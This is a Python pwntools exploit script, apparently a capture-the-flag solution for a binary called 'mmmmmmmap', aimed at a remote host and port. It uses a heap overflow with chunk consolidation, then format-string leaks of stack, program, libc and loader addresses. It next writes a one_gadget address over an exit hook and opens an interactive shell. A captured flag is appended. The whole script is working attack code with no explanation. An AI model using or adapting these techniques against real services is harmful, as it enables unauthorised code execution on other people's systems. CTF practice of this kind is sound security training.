from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('mmmmmmmap')
io = remote('129.211.173.64', 10004)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
ld = ELF('/lib64/ld-linux-x86-64.so.2')
elf = ELF('mmmmmmmap')

'''
0xe6c7e execve("/bin/sh", r15, r12)
constraints:
  [r15] == NULL || r15 == NULL
  [r12] == NULL || r12 == NULL

0xe6c81 execve("/bin/sh", r15, rdx)
constraints:
  [r15] == NULL || r15 == NULL
  [rdx] == NULL || rdx == NULL

0xe6c84 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL
'''

def encode(message):
    result = b''
    for b in message:
        result += p8(b ^ 6)
    return result


def add(size, content):
    io.sendlineafter('choice: ', '1')
    io.sendlineafter('Size: ', str(size))
    io.sendafter('Content: ', content)


def edit(index, content):
    io.sendlineafter('choice: ', '2')
    io.sendlineafter('Index: ', str(index))
    io.sendafter('Content: ', content)


def delete(index):
    io.sendlineafter('choice: ', '3')
    io.sendlineafter('Index: ', str(index))


def pwn():
    io.sendlineafter('Please tell me your lucky number(0x2-0xF):\n', '6')
    add(0xd18, b'a' * 0xd18)
    add(0x18, b'b' * 0x18)
    add(0xff8, b'c' * 0xff8)
    edit(1, encode(b'b' * 0x10 + p64(0x1000)))
    delete(2)
    io.sendlineafter('choice: ', '4')
    io.sendlineafter('INPUT:\n', '%6$p.%7$p.%11$p.%12$p.')
    stack = int(io.recvuntil('.')[:-1], 16)
    elf_base = int(io.recvuntil('.')[:-1], 16) - 0x18b0
    libc_base = int(io.recvuntil('.')[:-1], 16) - 0x270b3
    ld_base = int(io.recvuntil('.')[:-1], 16) - 0x2d620
    log.success('stack: ' + hex(stack))
    log.success('elf_base: ' + hex(elf_base))
    log.success('libc_base: ' + hex(libc_base))
    log.success('ld_base: ' + hex(ld_base))
    exit_hook = ld_base + 0x2ef68
    one_gadget = libc_base + 0xe6c7e
    log.success('exit_hook: ' + hex(exit_hook))
    log.success('one_gadget: ' + hex(one_gadget))
    target = stack + 0x10
    payload = b'%' + str(target & 0xffff).encode() + b'c' + b'%13$hn' + b'\x00'
    io.sendlineafter('INPUT:\n', payload)
    payload = b'%' + str(exit_hook & 0xffff).encode() + b'c' + b'%41$hn' + b'\x00'
    io.sendlineafter('INPUT:\n', payload)
    for i in range(6):
        one = (one_gadget >> (i * 8)) & 0xff
        payload = b'%' + str(one).encode() + b'c' + b'%12$hhn' + b'\x00'
        io.sendlineafter('INPUT:\n', payload)
        if i < 5:
            payload = b'%' + str((exit_hook & 0xff) + i + 1).encode() + b'c' + b'%41$hhn' + b'\x00'
            io.sendlineafter('INPUT:\n', payload)
    # gdb.attach(io)
    io.sendlineafter('INPUT:\n', b'exit\n\x00')
    # pause()
    io.interactive()


if __name__ == '__main__':
    pwn()


# flag{d010887a870d12833465e98b8abf2bb2}
